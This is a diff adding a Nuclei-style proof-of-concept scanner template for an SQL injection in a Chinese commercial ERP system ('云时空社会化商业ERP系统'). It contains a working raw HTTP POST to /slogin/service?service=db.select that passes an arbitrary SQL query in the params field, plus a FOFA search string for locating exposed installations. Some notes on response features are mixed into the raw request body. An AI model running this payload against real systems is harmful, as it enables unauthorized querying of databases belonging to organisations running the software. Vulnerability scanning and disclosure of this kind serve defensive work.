@@ -1,0 +1,42 @@
+id: poc-gtx5orn3revrtyxk
+info:
+  name: 云时空社会化商业ERP系统slogin SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gtx5orn3revrtyxk'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gtx5orn3revrtyxk
+    fofa: app="云时空社会化商业ERP系统"
+http:
+- raw:
+  - 'POST /slogin/service?service=db.select HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    params=%7B%22sql%22%3A%22SELECT+%2A+FROM+V%24VERSION%22%7D
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    values
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
